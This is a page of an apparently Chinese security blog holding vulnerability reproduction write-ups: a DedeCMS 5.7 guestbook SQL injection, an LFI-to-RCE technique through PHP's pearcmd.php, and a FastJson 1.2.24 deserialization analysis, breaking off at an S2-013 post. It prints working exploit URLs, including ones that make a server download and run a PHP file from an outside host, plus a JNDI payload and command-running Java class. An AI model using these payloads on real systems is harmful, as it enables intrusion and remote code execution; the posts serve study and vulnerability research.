<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/3/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
<ol>
<li>php magic_quotes_gpc=off</li>
<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
<pre><code class="php">if($action==&#39;admin&#39;)
{
    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);
    exit();
}</code></pre>
<p><code>/plus/guestbook/edit.inc.php</code></p>
<pre><code class="php">if($job==&#39;editok&#39;)
{
    $remsg = trim($remsg);
    if($remsg!=&#39;&#39;)
    {
        //管理员回复不过滤HTML
        if($g_isadmin)
        {
            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg; 
            //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;
        }
        else
        {
            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);
            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;
            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
            $msg = $oldmsg.$remsg;
        }
    } 
    $msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);
    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
    exit();
}</code></pre>
<p>其中:</p>
<pre><code class="php">$msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre>
<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
<pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
    {
        foreach($$_request as $_k =&gt; $_v) 
        {
            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }</code></pre>
<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
<pre><code class="php">function _RunMagicQuotes(&amp;$svar)
{
    if(!get_magic_quotes_gpc())
    {
        ...
    }
    return $svar;
}</code></pre>
<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/DedeCMS">https://www.ccreater.top/1970/01/01/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="https://www.ccreater.top/1970/01/01/DedeCMS">https://www.ccreater.top/1970/01/01/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ckmn57553001ls1ni8uj1daz9" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p>
<pre><code class="php">...
if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;])) {
    echo &#39;ERROR: either use the CLI php executable, &#39; .
         &#39;or set register_argc_argv=On in php.ini&#39;;
    exit(1);
}

$argv = Console_Getopt::readPHPArgv();
...
array_shift($argv);//这里删除了第一个argv，通常argv[0]是程序名
...</code></pre>
<p><code>Getopt.php:readPHPArgv</code></p>
<pre><code class="php">
    public static function readPHPArgv()
    {
        global $argv;
        if (!is_array($argv)) {
            if (!@is_array($_SERVER[&#39;argv&#39;])) {
                if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) {
                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;
                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);
                }
                return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];
            }
            return $_SERVER[&#39;argv&#39;];
        }
        return $argv;
    }</code></pre>
<p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p>
<p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p>
<p>访问<a href="http://127.0.0.1:60080/?1+2+3+4+%20+%dd" target="_blank" rel="noopener">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p>
<pre><code>/var/www/html/index.php:4:
array (size=6)
  0 =&gt; string &#39;1&#39; (length=1)
  1 =&gt; string &#39;2&#39; (length=1)
  2 =&gt; string &#39;3&#39; (length=1)
  3 =&gt; string &#39;4&#39; (length=1)
  4 =&gt; string &#39;%20&#39; (length=3)
  5 =&gt; string &#39;%dd&#39; (length=3)</code></pre><p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p>
<p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p>
<p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p>
<p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p>
<ol>
<li>register_argc_argv=On（默认是开的）</li>
<li>包含pearcmd.php或者peclcmd.php</li>
</ol>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p>
<p>exp1:</p>
<p>需要出网</p>
<pre><code>http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面
http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</code></pre><p>exp2:</p>
<p>需要出网</p>
<p>会下载到当前文件夹</p>
<pre><code>http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面
http://192.168.43.230:60080/?f=fuckyou.php</code></pre><p>exp3:</p>
<pre><code class="php">http://192.168.43.230:60080/?+config-create+/&lt;?=phpinfo();?&gt;/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符
http://192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</code></pre>
<p>exp4:</p>
<p><strong>最好用</strong></p>
<pre><code>http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面
http://192.168.43.230:60080/config2.php</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/LFI利用php自带的pearcmd.php直接RCE/">https://www.ccreater.top/1970/01/01/LFI利用php自带的pearcmd.php直接RCE/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" data-id="ckmn57554001ps1nibev3do45" data-title="LFI利用php自带的pearcmd.php直接RCE" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-FastJson1.2.24调试记录_复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="FastJson1-2-23-反序列化复现"><a href="#FastJson1-2-23-反序列化复现" class="headerlink" title="FastJson1.2.23 反序列化复现"></a>FastJson1.2.23 反序列化复现</h1><p>漏洞exp:</p>
<pre><code class="java">public class Exploit implements ObjectFactory {
    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) {
        exec(&quot;xterm&quot;);
        return null;
    }

    public static String exec(String var0) {
        try {
            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
        } catch (IOException var2) {
            var2.printStackTrace();
        }

        return &quot;&quot;;
    }

}</code></pre>
<p>FastJsonTest.java</p>
<pre><code class="java">public class App 
{
    public static void main( String[] args )
    {
        String payload=&quot;{\n&quot; +
                &quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +
                &quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,&quot; +
                &quot;    \&quot;autoCommit\&quot;:true\n&quot; +
                &quot;}&quot;;

        JSON.parseObject(payload);
    }
}</code></pre>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一步一步跟进去在<br>parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)<br>发现了关于@type的处理</p>
<pre><code>if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);
    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());

    ...

    ObjectDeserializer deserializer = config.getDeserializer(clazz);
    return deserializer.deserialze(this, clazz, fieldName);
}</code></pre><p>跟下去观察到是通过<code>Thread.currentThread().getContextClassLoader().loadClass(className);</code><br>来加载@type的对应的值<br>跟进config.getDeserializer(clazz);<br>最后是通过<code>derializer = createJavaBeanDeserializer(clazz, type);</code>来生成反序列化处理器</p>
<pre><code>public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) {
        boolean asmEnable = this.asmEnable;//不是安卓设备则为true
        if (asmEnable) {
            JSONType jsonType = clazz.getAnnotation(JSONType.class);

            if (jsonType != null) {//检测是否存在JSONType注释
                ...
            }

            if (asmEnable) {
                Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null
                if (superClass == null) {
                    superClass = clazz;
                }

                for (;;) {//检查clazz及其所有父类是否均为public
                    if (!Modifier.isPublic(superClass.getModifiers())) {
                        asmEnable = false;
                        break;
                    }

                    superClass = superClass.getSuperclass();
                    if (superClass == Object.class || superClass == null) {
                        break;
                    }
                }
            }
        }

        if (clazz.getTypeParameters().length != 0) {//没有使用泛型
            asmEnable = false;
        }

        if (asmEnable &amp;&amp; asmFactory != null &amp;&amp; asmFactory.classLoader.isExternalClass(clazz)) {
            asmEnable = false;
        }

        if (asmEnable) {//类名不存在.和不可见字符
            asmEnable = ASMUtils.checkName(clazz.getSimpleName());
        }

        if (asmEnable) {
            if (clazz.isInterface()) {
                asmEnable = false;
            }
            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);

            if (asmEnable &amp;&amp; beanInfo.fields.length &gt; 200) {
                asmEnable = false;
            }

            Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;
            if (asmEnable &amp;&amp; defaultConstructor == null &amp;&amp; !clazz.isInterface()) {
                asmEnable = false;
            }

            for (FieldInfo fieldInfo : beanInfo.fields) {
                ...
            }
        }

        if (asmEnable) {
            if (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) {
                asmEnable = false;
            }
        }

        if (!asmEnable) {
            return new JavaBeanDeserializer(this, clazz, type);
        }

        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
        try {
            return asmFactory.createJavaBeanDeserializer(this, beanInfo);
            // } catch (VerifyError e) {
            // e.printStackTrace();
            // return new JavaBeanDeserializer(this, clazz, type);
        } catch (NoSuchMethodException ex) {
            return new JavaBeanDeserializer(this, clazz, type);
        } catch (JSONException asmError) {
            return new JavaBeanDeserializer(this, beanInfo);
        } catch (Exception e) {
            throw new JSONException(&quot;create asm deserializer error, &quot; + clazz.getName(), e);
        }
    }</code></pre><p>阅读代码发现：</p>
<pre><code>1. 不是安卓设备
2. clazz是否存在JSONType注释
3. clazz及其所有父类都是public
4. clazz类的声明没有使用泛型
5. clazz的类名不存在.</code></pre><p>经过上述检查后进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></p>
<pre><code>
    public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) {
        JSONType jsonType = clazz.getAnnotation(JSONType.class);

        Class&lt;?&gt; builderClass = getBuilderClass(jsonType);

        Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段
        Method[] methods = clazz.getMethods();//获取所有public方法

        Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);
        Constructor&lt;?&gt; creatorConstructor = null;
        Method buildMethod = null;

        List&lt;FieldInfo&gt; fieldList = new ArrayList&lt;FieldInfo&gt;();

        if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) {
           ... 
        }

        if (defaultConstructor != null) {
            TypeUtils.setAccessible(defaultConstructor);
        }

        if (builderClass != null) {
            ...
        }

        for (Method method : methods) { //
            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
            String methodName = method.getName();
            if (methodName.length() &lt; 4) {
                continue;
            }//方法名大于4

            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }//非静态方法

            // support builder set
            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
                continue;
            }//返回值是void 或 clazz类
            Class&lt;?&gt;[] types = method.getParameterTypes();
            if (types.length != 1) {
                continue;
            }//只有一个参数

            ...

            if (!methodName.startsWith(&quot;set&quot;)) { // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
                continue;
            }//方法名以set开头

            char c3 = methodName.charAt(3);

            String propertyName;
            if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f
                || c3 &gt; 512 // for unicode method name
            ) //获得set方法对应的字段
            {
                if (TypeUtils.compatibleWithJavaBean) {
                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
                } else {
                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
                }
            } else if (c3 == &#39;_&#39;) {
                propertyName = methodName.substring(4);
            } else if (c3 == &#39;f&#39;) {
                propertyName = methodName.substring(3);
            } else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) {
                propertyName = TypeUtils.decapitalize(methodName.substring(3));
            } else {
                continue;
            }

            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
            if (field == null &amp;&amp; types[0] == boolean.class) {//字段不存在或是bool型
                String isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
                field = TypeUtils.getField(clazz, isFieldName, declaredFields);
            }

            ...

            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
                                         annotation, fieldAnnotation, null));//添加到fieldList
        }

        for (Field field : clazz.getFields()) { // 添加非静态字段
            int modifiers = field.getModifiers();
            if ((modifiers &amp; Modifier.STATIC) != 0) {//不允许STATIC
                continue;
            }

            if((modifiers &amp; Modifier.FINAL) != 0) {
                Class&lt;?&gt; fieldType = field.getType();
                boolean supportReadOnly = Map.class.isAssignableFrom(fieldType) 
                        || Collection.class.isAssignableFrom(fieldType)
                        || AtomicLong.class.equals(fieldType) //
                        || AtomicInteger.class.equals(fieldType) //
                        || AtomicBoolean.class.equals(fieldType);
                if (!supportReadOnly) {
                    continue;
                }
            }

            boolean contains = false;
            for (FieldInfo item : fieldList) {
                if (item.name.equals(field.getName())) {
                    contains = true;
                    break; // 已经是 contains = true，无需继续遍历
                }
            }

            if (contains) {
                continue;
            }

            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
            String propertyName = field.getName();

            ...

            add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,
                                         fieldAnnotation, null));
        }

        for (Method method : clazz.getMethods()) { // getter methods
            String methodName = method.getName();
            if (methodName.length() &lt; 4) {
                continue;
            }

            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }

            if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) {
                if (method.getParameterTypes().length != 0) {
                    continue;
                }

                if (Collection.class.isAssignableFrom(method.getReturnType()) //
                    || Map.class.isAssignableFrom(method.getReturnType()) //
                    || AtomicBoolean.class == method.getReturnType() //
                    || AtomicInteger.class == method.getReturnType() //
                    || AtomicLong.class == method.getReturnType() //
                ) {
                    String propertyName;

                    ...

                    FieldInfo fieldInfo = getField(fieldList, propertyName);
                    if (fieldInfo != null) {
                        continue;
                    }

                    if (propertyNamingStrategy != null) {
                        propertyName = propertyNamingStrategy.translate(propertyName);
                    }

                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));
                }
            }
        }

        return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);
    }
</code></pre><p>大致总结一下会将哪些字段添加到FieldList中：</p>
<pre><code>1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）
2. 非Static和Final的字段（是的话要满足某些条件）
3. 返回值是满足某些条件的非静态get方法对应的字段</code></pre><p>最后返回排序后的FieldList,生成deserializer<br>接着调用了<code>return deserializer.deserialze(this, clazz, fieldName);</code><br>在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入<code>parseField</code><br><code>@type</code>字典下的其他字段,会进入<br><code>boolean match = parseField(parser, key, object, type, fieldValues);</code></p>
<pre><code>    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
                              Map&lt;String, Object&gt; fieldValues) {
        JSONLexer lexer = parser.lexer; // xxx

        FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null

        final int mask = Feature.SupportNonPublicField.mask;
        ...

        lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());

        fieldDeserializer.parseField(parser, object, objectType, fieldValues);

        return true;
    }</code></pre><p>在fieldList字段查找存在后进入<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p>
<pre><code>    public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) {
        ...
        Object value;
        if (fieldValueDeserilizer instanceof JavaBeanDeserializer) {
            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;
            value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);
        } else {
            ...
            } else {
                value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值
            }
        }
        if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) {
            ...
        } else {
            if (object == null) {
                fieldValues.put(fieldInfo.name, value);
            } else {
                setValue(object, value);//进入这里
            }
        }
    }</code></pre><p>最后进入setValue</p>
<pre><code>ublic void setValue(Object object, Object value) {
        if (value == null //
            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) {
            return;
        }

        try {
            Method method = fieldInfo.method;
            if (method != null) {
                if (fieldInfo.getOnly) {
                    ...
                } else {
                    method.invoke(object, value);
                }
                return;
            } else {
                ...
            }
        } catch (Exception e) {
            throw new JSONException(&quot;set property error, &quot; + fieldInfo.name, e);
        }
    }</code></pre><p>进入对应字段的set或者get方法</p>
<p>至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了<br>因为以下payload能成功</p>
<pre><code class="java">import com.sun.rowset.JdbcRowSetImpl;

public class CLIENT {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用
        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/aa&quot;);//可控uri
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}</code></pre>
<p>且符合</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li><input checked="" disabled="" type="checkbox"> 非静态方法</li>
<li><input checked="" disabled="" type="checkbox"> 返回类型为void或当前类</li>
<li><input checked="" disabled="" type="checkbox"> 参数个数为1个<br>这些条件<br>RCE达成</li>
</ul>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/FastJson1.2.24调试记录_复现/">https://www.ccreater.top/1970/01/01/FastJson1.2.24调试记录_复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="ckmn57555001ss1nib5ge0ydg" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-S2-013_S2-014远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
